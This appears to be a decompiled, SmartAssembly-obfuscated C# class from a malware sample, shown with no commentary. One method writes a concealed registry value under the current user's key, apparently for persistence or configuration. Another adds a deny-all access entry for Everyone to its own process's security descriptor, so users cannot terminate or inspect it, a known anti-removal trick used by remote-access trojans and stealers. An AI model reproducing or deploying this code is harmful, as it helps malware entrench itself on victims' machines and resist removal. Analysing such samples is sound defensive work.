using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace EJhaxGWLzpBbb;

internal sealed class tATAganCkKkudc
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr kToGtiqrjC, int xAYgkiEmaUDjTCNyxV, [Out] byte[] PXXYllvKbDhJvI, uint npfzeZxkgEPL, out uint TSruKKsYRdyds);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr BuYsNZEkzaWKc, int FCLraNONxrD, [In] byte[] BoJBuslgHZqXxN);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void RnPMoSyldZRy(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107199054)));
			registryKey.SetValue(hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107198949)), getString_0(107396600));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor lTqMWjoPksHD(IntPtr intptr_0)
	{
		byte[] pXXYllvKbDhJvI = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, pXXYllvKbDhJvI, 0u, out var TSruKKsYRdyds);
		if ((long)TSruKKsYRdyds > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, pXXYllvKbDhJvI = new byte[TSruKKsYRdyds], TSruKKsYRdyds, out TSruKKsYRdyds))
		{
			return null;
		}
		return new RawSecurityDescriptor(pXXYllvKbDhJvI, 0);
	}

	private void pRMXUbwblhqhG(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void rhDhFNxGVqt()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = lTqMWjoPksHD(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			pRMXUbwblhqhG(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static tATAganCkKkudc()
	{
		Strings.CreateGetStringDelegate(typeof(tATAganCkKkudc));
	}
}
